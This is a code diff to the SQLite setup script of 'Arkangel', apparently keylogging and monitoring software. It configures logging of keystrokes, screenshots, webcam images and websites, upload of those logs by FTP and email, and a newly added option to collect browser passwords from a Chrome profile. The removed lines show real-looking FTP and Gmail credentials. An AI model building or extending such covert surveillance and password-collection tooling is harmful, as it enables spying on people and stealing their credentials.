@@ -42,9 +42,9 @@ try:
     # FTP server '
     c.execute('''CREATE TABLE IF NOT EXISTS FTPServer
             (id INTEGER NOT NULL UNIQUE,
-            hostname TEXT DEFAULT "ftp.drivehq.com",
-            uname TEXT DEFAULT "batong96",
-            password TEXT DEFAULT "2ebnjzfj",
+            hostname TEXT DEFAULT "ftp.example.com",
+            uname TEXT DEFAULT "username",
+            password TEXT DEFAULT "password",
             dir TEXT DEFAULT "/", passiveMode INTEGER DEFAULT 1
             , FOREIGN KEY (id) REFERENCES Users(id))''')
     
@@ -55,7 +55,7 @@ try:
              hours INTEGER DEFAULT 1, minutes INTEGER DEFAULT 0,
              enDelEvery INTEGER NOT NULL DEFAULT 0,
              days INTEGER DEFAULT 3,
-             datetime TEXT DEFAULT "25-Jun-18 11:27:01 PM",
+             datetime TEXT DEFAULT "1-Jan-18 11:11:11 PM",
              enDelAfterUpload INTEGER DEFAULT 0,
              FOREIGN KEY (id) REFERENCES Users(id))''')
     
@@ -83,7 +83,7 @@ try:
             hours INTEGER DEFAULT 1,
             minutes INTEGER DEFAULT 0
              , quality INTEGER DEFAULT 50,
-             datetime TEXT NOT NULL DEFAULT "25-Jun-18 11:27:01 PM"
+             datetime TEXT NOT NULL DEFAULT "1-Jan-18 11:11:11 PM"
              , FOREIGN KEY (id) REFERENCES Users(id))''')    
     #Email table'
     c.execute('''CREATE TABLE IF NOT EXISTS Email
@@ -102,12 +102,12 @@ try:
     #Email Delivery '
     c.execute('''CREATE TABLE IF NOT EXISTS EmailDelivery
             ( id INTEGER NOT NULL UNIQUE,
-            sendto TEXT DEFAULT "khongcotien0123@gmail.com"
+            sendto TEXT DEFAULT "userA@gmail.com"
             , smpt TEXT DEFAULT "smtp.gmail.com",
             port INTEGER DEFAULT 587,
-            uname TEXT DEFAULT "khongcotien0123@gmail.com",
-            password TEXT DEFAULT "khongcotien0123",
-            subject TEXT DEFAULT "Send test",
+            uname TEXT DEFAULT "userB@gmail.com",
+            password TEXT DEFAULT "password",
+            subject TEXT DEFAULT "Message from Arkangel!",
             FOREIGN KEY (id) REFERENCES Users(id))''')
 
     #Alerts table '
@@ -122,8 +122,18 @@ try:
              key TEXT NOT NULL DEFAULT "password",
              FOREIGN KEY (id) REFERENCES Users(id))''')
 
+    #web usgae
+    c.execute('''CREATE TABLE IF NOT EXISTS webusage
+            (id INTEGER NOT NULL,
+                getHistory INTEGER NOT NULL DEFAULT 0,
+                getBookmark INTEGER NOT NULL DEFAULT 0,
+                getPassword INTEGER NOT NULL DEFAULT 0,
+            FOREIGN KEY (id) REFERENCES Users(id))''')
+
     #current user
-    c.execute('''CREATE TABLE IF NOT EXISTS current_user (id INTEGER)''')
+    c.execute('''CREATE TABLE IF NOT EXISTS current_user
+            (id INTEGER, token TEXT NOT NULL
+            ,FOREIGN KEY (id) REFERENCES Users(id))''')
 
     #user monitoring
     # enable : 1 - monitor all user
@@ -132,8 +142,7 @@ try:
     c.execute('''CREATE TABLE IF NOT EXISTS monitor_user
             (id INTEGER NOT NULL UNIQUE, enable INTEGER NOT NULL DEFAULT 1,
             current_user TEXT DEFAULT "Administrator",
-            FOREIGN KEY (id) REFERENCES Users(id))
-        ''')
+            FOREIGN KEY (id) REFERENCES Users(id)) ''')
     #user monitorinng list
     c.execute('''CREATE TABLE IF NOT EXISTS user_list
             (id INTEGER NOT NULL, user TEXT,
@@ -146,11 +155,11 @@ try:
         #                1: vietnamese
     c.execute('''CREATE TABLE IF NOT EXISTS Setting
             (id INTEGER NOT NULL UNIQUE,
-            textLog TEXT NOT NULL DEFAULT "./",
-            webcamLog TEXT NOT NULL DEFAULT "./",
-            screenshotLog TEXT NOT NULL DEFAULT "./",
+            textLog TEXT NOT NULL DEFAULT "C:\Program Files\Arkangel Team\Arkangel\Logs",
+            webcamLog TEXT NOT NULL DEFAULT "C:\Program Files\Arkangel Team\Arkangel\Logs",
+            screenshotLog TEXT NOT NULL DEFAULT "C:\Program Files\Arkangel Team\Arkangel\Logs",
             keystrokeMode INTEGER NOT NULL DEFAULT 0,
-            websiteLog TEXT NOT NULL DEFAULT "./",
+            websiteLog TEXT NOT NULL DEFAULT "C:\Program Files\Arkangel Team\Arkangel\Logs",
             profilePath TEXT NOT NULL DEFAULT 
             "\\AppData\\Local\\Google\\Chrome\\User Data\\Default",
             FOREIGN KEY (id) REFERENCES Users(id))
@@ -160,8 +169,6 @@ try:
     # add triger auto load default config
     c.execute('''CREATE TRIGGER IF NOT EXISTS aft_insert AFTER INSERT ON Users
         BEGIN
-            INSERT INTO current_user(id) VALUES (NEW.id);
-            
             INSERT INTO General(id) VALUES (NEW.id);
             
             INSERT INTO FTP(id) VALUES (NEW.id);
@@ -184,6 +191,8 @@ try:
             
             INSERT INTO Setting (id) VALUES (NEW.id);
 
+            INSERT INTO webusage (id) VALUES (NEW.id);
+
         END; ''')
     
 except Exception as ex:
@@ -191,35 +200,47 @@ except Exception as ex:
 
 
 
-# Insert a row of data
-c.execute("INSERT INTO Users(username, password) VALUES ('user01','user01')")
 
-c.execute('''UPDATE Users SET username = 'abc@gmail.com',password = '123456789'
-WHERE id = (SELECT current_user.id from current_user)''')
+##c.execute('''
+##UPDATE Targets SET enAllApp = 0, enFollowApp =1
+##WHERE id =(SELECT current_user.id from current_user)
+##''')
+
+# Insert a row of data
+#c.execute("UPDATE current_user SET token = '5b42d37e3e04900f1c19eba4'")
+c.execute("INSERT INTO Users(username, password) VALUES ('bla','dhoqidnkew')")
+
+c.execute("INSERT INTO current_user(id,token) VALUES (1,'abc')")
+
+##c.execute('''UPDATE Users SET username = 'zxc@gmail.com',password = '123456789'
+##WHERE id =(SELECT current_user.id from current_user)''')
 
 #c.execute("INSERT INTO Users VALUES (123,'user02','user02')")
 #r = c.execute('SELECT * FROM Users').fetchall()
+##c.execute('''UPDATE FTPServer SET dir = '\\test'
+##WHERE id = (SELECT current_user.id from current_user)''')
+##
+##c.execute('''UPDATE FTP SET enable = 1,upKeystroke = 1, upScrshot = 1,
+##            upWebcam = 1, upWebsite = 1,
+##            upSize = 0,  clear = 1
+##            WHERE id = (SELECT current_user.id from current_user) ''')
+##
+#c.execute('''UPDATE Email SET enable = 1, upKeystroke = 1, upScrshot = 1,
+#            upWebcam = 1, upWebsite = 1,
+#            enLimit = 0,
+#            clear = 0 WHERE id = (SELECT current_user.id from current_user) ''')
 
-c.execute('''UPDATE FTP SET enable = 1,upKeystroke = 1, upScrshot = 1,
-            upWebcam = 1, upWebsite = 1,
-            upSize = 0,  clear = 1
-            WHERE id = (SELECT current_user.id from current_user) ''')
+##c.execute('''UPDATE Webcam SET enDelAfterUpload = 1
+##    WHERE id = (SELECT current_user.id from current_user) ''')
+##
+##c.execute('''UPDATE Setting SET profilePath =
+##            "\\AppData\\Local\\Google\\Chrome\\User Data\\Profile 7"
+##            WHERE id = (SELECT current_user.id from current_user)''');
 
-c.execute('''UPDATE Email SET enable = 1, upKeystroke = 1, upScrshot = 1,
-            upWebcam = 1, upWebsite = 1,
-            enLimit = 0,
-            clear = 1 WHERE id = (SELECT current_user.id from current_user) ''')
-
-c.execute('''UPDATE Webcam SET enDelAfterUpload = 1
-    WHERE id = (SELECT current_user.id from current_user) ''')
-
-c.execute('''UPDATE Setting SET profilePath =
-            "\\AppData\\Local\\Google\\Chrome\\User Data\\Profile 7"
-            WHERE id = (SELECT current_user.id from current_user)''');
-
-#print(c.execute('SELECT * from Setting').fetchall())
-c.execute('UPDATE Targets SET enAllApp = 0,enFollowApp = 1 WHERE id = 1');
-#print(c.execute('SELECT * FROM Targets').fetchall())
+###print(c.execute('SELECT * from Setting').fetchall())
+##c.execute('UPDATE Targets SET enAllApp = 0,enFollowApp = 1 WHERE id = 1');
+##
+###print(c.execute('SELECT * FROM Targets').fetchall())
 #----------------------
 #c.execute("INSERT INTO Alerts VALUES (1,0,1)")
 #s = c.execute('SELECT * FROM Alerts WHERE id =1').fetchone()
